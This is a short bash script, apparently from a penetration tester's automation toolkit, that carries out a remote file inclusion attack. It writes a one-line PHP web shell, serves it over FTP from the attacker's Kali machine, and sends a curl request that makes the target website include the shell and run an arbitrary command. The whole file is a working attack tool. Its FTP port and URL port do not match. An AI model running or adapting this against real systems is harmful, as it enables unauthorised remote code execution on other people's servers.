#!/bin/bash

: '
Remote RFI with HTTP
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "Website" "Cmd"

WEBSITE=${form_data["Website"]}
CMD=${form_data["Cmd"]}

python -m pyftpdlib -p 21 &
FTP_PID=$!

cat << 'EOF' > webShell.php
<?php system($_GET['cmd']); ?>
EOF

paste_command "curl -ks '${WEBSITE}ftp://${KALI_IP}:9001/webShell.php&cmd=${CMD}'"
xdotool key Return
sleep 5

kill $FTP_PID
rm webShell.php